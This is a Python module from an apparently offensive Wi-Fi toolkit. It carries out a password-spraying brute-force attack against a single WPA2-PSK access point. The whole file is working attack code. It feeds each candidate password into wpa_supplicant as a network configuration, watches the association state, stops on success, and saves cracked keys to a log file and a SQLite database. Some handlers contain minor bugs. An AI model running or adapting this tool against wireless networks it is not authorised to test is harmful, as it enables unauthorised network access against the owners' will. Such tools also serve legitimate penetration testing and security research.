# Module: wpabrute.py
# Description: Performs a Spray Brute-force attack against the Wi-Fi Protected Access (WPA) protocol.
# The WPAbrute module is tailored to spray a list of passwords against a single access point/SSID.
# Author: Nick Sanzotta/@Beamr
# Version: v 1.09252017
try:
	import os, sys, threading, datetime, time
	from wpa_supplicant.core import WpaSupplicantDriver
	from twisted.internet.selectreactor import SelectReactor
	from twisted.internet import task
	from theme import *
except Exception as e:
	print('\n [!] WPABRUTE - Error: ' % (e))
	sys.exit(1)
	
try:
	from dbcommands import DB
	import sqlite3
	conn = sqlite3.connect('data/WiFiSuite.db', check_same_thread=False) # Thread Support
	conn.text_factory = str # Interpret 8-bit bytestrings 
	conn.isolation_level = None # Autocommit Mode
	db = DB(conn)
except Exception as e:
	print(red('!')+'Could not connect to database: %s' % (e))
	sys.exit(1)

class wpaBrute(threading.Thread):
	def __init__(self, ssid, password, passwordList, supplicantInt, interface):
			threading.Thread.__init__(self)
			self.setDaemon(1) # daemon
			self.ssid = ssid
			self.password = password
			self.passwordList = passwordList # original passwordList prior to Queue_password, used to enumerate password count.
			self.supplicantInt = supplicantInt
			self.interface = interface
			self.log_timestamp = '{:%Y-%m-%d_%H:%M:%S}'.format(datetime.datetime.now())
			self.wpakey_log = 'data/wpakeys/%s_%s.wpakey' % (self.ssid, self.log_timestamp)

	def run(self):
		self.datafolders_check()
		# Time Stamp for file creation
		timestr = time.strftime("%Y%m%d-%H%M") # NOT SURE I NEED THIS ANY LONGER
		# Time Stamp for entire credential spray
		curr_time1 = time.time()
		# Container of successfully authenticated psk
		successList = []
		# Kill Switch to stop on success
		stop = False
		# Count number of users in list
		password_list_length = len(self.passwordList)
		# Checks password Queue
		while not self.password.empty():
			cls()
			banner()
			password_counter = 0
			for password in self.password.get():
				password_counter +=1
				if stop:
					break
				else:
					# Time Stamp for each user
					curr_time2 = time.time()
					#DEBUG PRINT
					network_cfg = {
							"disabled": 0,
							"ssid": self.ssid, 
							"mode": 0,
							"proto": "WPA2",
							"key_mgmt": "WPA-PSK",
							"pairwise": "CCMP",
							"psk": password,	

						}		

					# Conf Added # Adds a new network to the interface
					self.interface.add_network(network_cfg)
					# Attempt association with a configured network # Connect to Network Profile 0
					self.interface.select_network(self.supplicantInt+'/Networks/0')	
					# DEBUG: Print Current WPA CONF
					# print(interface.get_current_network())	

				while True:
					if self.interface.get_state() == 'completed':
						print(' Brute-forcing SSID : ' + ' ' + self.ssid)
						print(' Testing PSK        : ' + ' ' + password)
						print(' Interface          : ' + ' ' + self.interface.get_ifname())
						print(' Interface Status   : ' + ' ' + self.interface.get_state())
						print(' Authentication     : ' + ' Success: '+ colors.green + '[!]' + colors.normal)
						print(' Elapsed Time       :  %.1fs' % (time.time() - curr_time2))
						print(' Attempts           :  [%s/%s]\n' % (password_counter, password_list_length))
						pskSuccess = password
						successList.append(pskSuccess)
						db.wpabrute_commit(self.ssid, password)
						# Remove from associated network, which results in state: 'inactive'
						self.interface.remove_network(self.supplicantInt+'/Networks/0')
						# Sets Kill Switch to true
						stop = True
						# Wait for inactive state, based on a timer.
						time.sleep(7)
					elif self.interface.get_state() == 'disconnected':
						print(' Brute-forcing SSID : ' + ' ' + self.ssid)
						print(' Testing PSK        : ' + ' ' + password)
						print(' Interface          : ' + ' ' + self.interface.get_ifname())
						print(' Interface Status   : ' + ' ' + self.interface.get_state())
						print(' Authentication     : ' + ' Failed: '+ colors.red + '[!]' + colors.normal)
						print(' Elapsed Time       :  %.1fs' % (time.time() - curr_time2))
						print(' Attempts           :  [%s/%s]\n' % (password_counter, password_list_length))
						# Remove from associated network, which results in state: 'inactive'
						try:
							self.interface.remove_network(self.supplicantInt+'/Networks/0')
						except Exception as e:
							print(' [!] Error: ' + str(e))
							print(' [i] Attempting to recover.\n')
							time.sleep(1.5) # Testing might be able to lower this value
							pass
						# Wait for inactive state, based on a timer.
						time.sleep(7) # May be able to lower this value for WPA?
					elif self.interface.get_state() == 'inactive':
						break

			cls()
			banner()
			try:
				print(normal('*')+'Completed in: %.1fs' % (time.time() - curr_time1))
				print(normal('*')+'SSID Brute-forced: %s' % (self.ssid))
				print(normal('*')+'Number of Password(s) Tested: [%s]' % (password_list_length))

				if len(successList):
					print('\n'+normal('*')+'WPA Key Log: %s' % (self.wpakey_log))
					for passwd in successList:
						print(green('*')+passwd)
						with open(self.wpakey_log, 'a+') as f1:
							f1.write(passwd+'\n')
				else:
					print(normal('*')+'WPA Key Not Discovered')
			except UnboundLocalError:
				print(red('!')+'Error: %s' % (e))	
	
			self.password.task_done()
	
	def datafolders_check(self):
		'''Creates wpakeys folder(s) if missing'''
		wpakeys_directory = 'data/wpakeys'
		if not os.path.exists(wpakeys_directory):
			os.makedirs(wpakeys_directory)
